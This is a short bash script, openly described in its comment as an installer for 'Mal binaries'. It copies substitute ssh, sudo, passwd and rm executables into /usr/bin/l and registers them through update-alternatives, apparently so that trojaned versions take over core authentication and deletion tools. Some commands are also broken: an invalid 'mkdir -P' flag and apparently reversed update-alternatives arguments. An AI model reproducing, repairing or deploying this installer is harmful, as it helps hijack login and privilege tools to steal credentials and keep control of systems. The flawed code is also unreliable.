#!/bin/bash
# This script is Supposed to be bundled with the Mal binaries in the same directory.
#

sudo mkdir -P /usr/bin/l
sudo cp  ./ssh /usr/bin/l 
sudo update-alternatives --install /usr/bin/l/ssh ssh /usr/bin/ssh 90
sudo cp  ./sudo /usr/bin/l
sudo update-alternatives --install /usr/bin/l/sudo sudo /usr/bin/sudo 90
sudo cp  ./passwd /usr/bin/l
sudo update-alternatives --install /usr/bin/l/passwd passwd /usr/bin/passwd 90
sudo cp ./rm /usr/bin/l
sudo update-alternatives --install /usr/bin/l/rm rm /usr/bin/rm 90
